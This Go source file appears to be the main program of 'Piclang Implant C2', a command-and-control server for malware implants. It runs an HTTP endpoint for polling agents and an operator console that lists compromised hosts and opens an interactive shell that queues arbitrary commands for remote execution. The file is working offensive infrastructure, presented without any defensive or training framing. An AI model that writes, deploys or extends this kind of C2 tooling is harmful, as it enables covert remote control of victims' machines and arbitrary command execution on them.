package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

const (
	colorReset   = "\033[0m"
	colorDim     = "\033[2m"
	colorBold    = "\033[1m"
	colorCyan    = "\033[36m"
	colorGreen   = "\033[32m"
	colorYellow  = "\033[33m"
	colorRed     = "\033[31m"
	colorMagenta = "\033[35m"
)

func main() {
	listen := flag.String("listen", ":8080", "HTTP listen address")
	timeout := flag.Duration("timeout", 60*time.Second, "wait for agent command output")
	verbose := flag.Bool("v", false, "log agent HTTP traffic to stderr")
	flag.Parse()

	// Always announce agent activity on stderr so the operator sees check-ins
	// even while sitting at the c2> prompt. -v adds request-level detail.
	logf := func(format string, args ...any) {
		fmt.Fprintf(os.Stderr, colorDim+"[agent] "+format+colorReset+"\n", args...)
	}
	if *verbose {
		// keep same logger; server already tags GET/POST
		_ = verbose
	}

	reg := newRegistry(logf)
	mux := http.NewServeMux()
	mux.Handle(pathPrefix, reg.Handler())
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		_, _ = ioWriteString(w, "Piclang Implant C2\nGET|POST /v1/terminal/{agentID}\n")
	})

	srv := &http.Server{Addr: *listen, Handler: mux}
	ln, err := net.Listen("tcp", *listen)
	if err != nil {
		fmt.Fprintf(os.Stderr, "listen: %v\n", err)
		os.Exit(1)
	}
	actual := ln.Addr().String()

	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			fmt.Fprintf(os.Stderr, "http: %v\n", err)
			os.Exit(1)
		}
	}()

	printBanner(actual)

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	go func() {
		<-ctx.Done()
		_ = srv.Shutdown(context.Background())
	}()

	repl(reg, actual, *timeout)
	_ = srv.Shutdown(context.Background())
	fmt.Println(colorDim + "bye." + colorReset)
}

func printBanner(listen string) {
	fmt.Println()
	fmt.Println(colorCyan + "╔══════════════════════════════════════════╗" + colorReset)
	fmt.Println(colorCyan + "║" + colorReset + colorBold + "  Piclang Implant C2                      " + colorReset + colorCyan + "║" + colorReset)
	fmt.Println(colorCyan + "║" + colorReset + colorDim + "  listen " + listen + pad(30-len(listen)) + colorReset + colorCyan + "║" + colorReset)
	fmt.Println(colorCyan + "║" + colorReset + colorDim + "  agents: last 24h  ·  no DB               " + colorReset + colorCyan + "║" + colorReset)
	fmt.Println(colorCyan + "╚══════════════════════════════════════════╝" + colorReset)
	fmt.Println(colorDim + "  type " + colorReset + colorBold + "help" + colorReset + colorDim + " for commands" + colorReset)
	fmt.Println()
}

func pad(n int) string {
	if n <= 0 {
		return ""
	}
	return strings.Repeat(" ", n)
}

func repl(reg *Registry, listen string, timeout time.Duration) {
	in := bufio.NewScanner(os.Stdin)
	// allow long pastes
	buf := make([]byte, 0, 64*1024)
	in.Buffer(buf, 1024*1024)

	for {
		fmt.Print(colorBold + colorGreen + "c2" + colorReset + colorBold + "> " + colorReset)
		if !in.Scan() {
			fmt.Println()
			return
		}
		line := strings.TrimSpace(in.Text())
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		cmd := strings.ToLower(fields[0])
		args := fields[1:]

		switch cmd {
		case "help", "?":
			printHelp()
		case "agents", "ls", "list":
			printAgents(reg)
		case "shell", "use", "interact":
			if len(args) < 1 {
				fmt.Println(colorRed + "usage: shell <agent-id|prefix>" + colorReset)
				continue
			}
			a, errMsg := reg.Find(args[0])
			if errMsg != "" {
				fmt.Println(colorRed + errMsg + colorReset)
				continue
			}
			shellMode(in, a, timeout)
		case "listen", "addr":
			fmt.Printf("listen %s\n", listen)
			fmt.Printf("  GET/POST http://%s/v1/terminal/{agentID}\n", displayHost(listen))
		case "clear", "cls":
			fmt.Print("\033[2J\033[H")
		case "quit", "exit", "q":
			return
		default:
			fmt.Printf(colorYellow+"unknown command %q - try help\n"+colorReset, cmd)
		}
	}
}

func printHelp() {
	fmt.Println(colorBold + "commands" + colorReset)
	fmt.Println("  " + colorCyan + "agents" + colorReset + "              list agents seen in the last 24h")
	fmt.Println("  " + colorCyan + "shell <id>" + colorReset + "          interactive pseudo-shell for an agent")
	fmt.Println("  " + colorCyan + "listen" + colorReset + "              show listen address")
	fmt.Println("  " + colorCyan + "clear" + colorReset + "               clear screen")
	fmt.Println("  " + colorCyan + "help" + colorReset + "                this text")
	fmt.Println("  " + colorCyan + "quit" + colorReset + "                exit")
	fmt.Println()
	fmt.Println(colorDim + "inside shell: type a command to run on the agent; " + colorReset + colorCyan + "back" + colorReset + colorDim + " returns here" + colorReset)
}

func printAgents(reg *Registry) {
	list := reg.List()
	if len(list) == 0 {
		fmt.Println(colorDim + "(no agents in the last 24h - start an implant)" + colorReset)
		return
	}
	fmt.Printf(colorBold+"%-10s  %-12s  %-20s  %s\n"+colorReset, "SHORT", "STATUS", "LAST SEEN", "FULL ID")
	for _, a := range list {
		st := colorGreen + "idle" + colorReset
		if a.hasPending() {
			st = colorYellow + "pending" + colorReset
		}
		fmt.Printf("%-10s  %-20s  %-20s  %s\n",
			colorCyan+shortID(a.ID)+colorReset,
			st,
			relAge(a.LastSeen),
			a.ID,
		)
	}
	fmt.Printf(colorDim+"%d agent(s)\n"+colorReset, len(list))
}

func shellMode(in *bufio.Scanner, a *Agent, timeout time.Duration) {
	short := shortID(a.ID)
	fmt.Printf(colorDim+"entering shell for "+colorReset+colorMagenta+"%s"+colorReset+colorDim+"  (full %s)\n"+colorReset, short, a.ID)
	fmt.Printf(colorDim+"commands run on next agent poll · timeout %s · type "+colorReset+colorCyan+"back"+colorReset+colorDim+" to leave\n"+colorReset, timeout)

	for {
		fmt.Printf(colorBold+colorMagenta+"agent:%s"+colorReset+colorBold+"» "+colorReset, short)
		if !in.Scan() {
			fmt.Println()
			return
		}
		line := strings.TrimRight(in.Text(), "\r\n")
		trim := strings.TrimSpace(line)
		if trim == "" {
			continue
		}
		low := strings.ToLower(trim)
		if low == "back" || low == "exit" || low == "quit" {
			fmt.Println(colorDim + "left shell" + colorReset)
			return
		}

		if err := a.QueueCommand(line); err != nil {
			fmt.Println(colorRed + err.Error() + colorReset)
			continue
		}
		fmt.Print(colorDim + "… waiting for agent …" + colorReset + "\r")
		out, ok := a.WaitResult(timeout)
		// clear wait line
		fmt.Print("\033[2K\r")
		if !ok {
			fmt.Println(colorRed + "timeout: agent did not return output" + colorReset)
			continue
		}
		// print output as-is (may lack trailing newline)
		if out == "" {
			fmt.Println(colorDim + "(empty output)" + colorReset)
			continue
		}
		fmt.Print(out)
		if !strings.HasSuffix(out, "\n") {
			fmt.Println()
		}
	}
}

func displayHost(listen string) string {
	host, port, err := net.SplitHostPort(listen)
	if err != nil {
		return listen
	}
	if host == "" || host == "0.0.0.0" || host == "::" {
		host = "127.0.0.1"
	}
	return net.JoinHostPort(host, port)
}

func ioWriteString(w http.ResponseWriter, s string) (int, error) {
	return w.Write([]byte(s))
}
